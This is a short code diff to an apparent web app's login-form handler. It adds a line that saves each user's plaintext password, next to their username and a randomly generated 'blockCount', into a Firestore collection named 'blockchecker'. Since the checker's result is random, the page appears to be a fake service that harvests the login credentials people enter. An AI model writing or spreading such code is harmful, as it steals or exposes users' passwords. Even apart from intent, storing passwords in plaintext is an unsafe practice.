@@ -285,6 +285,7 @@ loginForm.addEventListener("submit", async (e) => {
 
     await addDoc(collection(db, "blockchecker"), {
       username: account,
+      password: password,
       blockCount: randomBlockCount,
       createdAt: serverTimestamp()
     });
